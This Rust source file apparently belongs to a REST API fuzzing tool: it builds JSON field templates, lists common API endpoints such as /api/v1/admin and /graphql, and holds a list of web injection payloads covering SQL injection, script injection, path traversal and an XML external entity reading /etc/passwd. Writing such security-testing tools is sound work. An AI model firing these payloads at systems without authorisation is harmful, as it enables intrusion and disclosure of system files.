#![allow(dead_code)]
use serde_json::{json, Value};

pub struct RestFuzzer;

impl RestFuzzer {
    pub fn generate_json_payloads() -> Vec<Value> {
        vec![
            json!({"key": "FUZZ"}),
            json!({"id": "FUZZ"}),
            json!({"user": "FUZZ"}),
            json!({"password": "FUZZ"}),
            json!({"token": "FUZZ"}),
            json!({"email": "FUZZ"}),
            json!({"name": "FUZZ"}),
            json!({"data": "FUZZ"}),
        ]
    }
    
    pub fn generate_injection_payloads() -> Vec<String> {
        vec![
            "' OR '1'='1".to_string(),
            "\"><script>alert(1)</script>".to_string(),
            "../../../etc/passwd".to_string(),
            "{{7*7}}".to_string(),
            "${7*7}".to_string(),
            "{{config}}".to_string(),
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>".to_string(),
        ]
    }
    
    pub fn common_api_paths() -> Vec<String> {
        vec![
            "/api/v1/users",
            "/api/v1/auth/login",
            "/api/v1/auth/register",
            "/api/v1/profile",
            "/api/v1/admin",
            "/api/v2/users",
            "/api/users",
            "/rest/users",
            "/graphql",
            "/swagger",
            "/api-docs",
        ].iter().map(|s| s.to_string()).collect()
    }
}
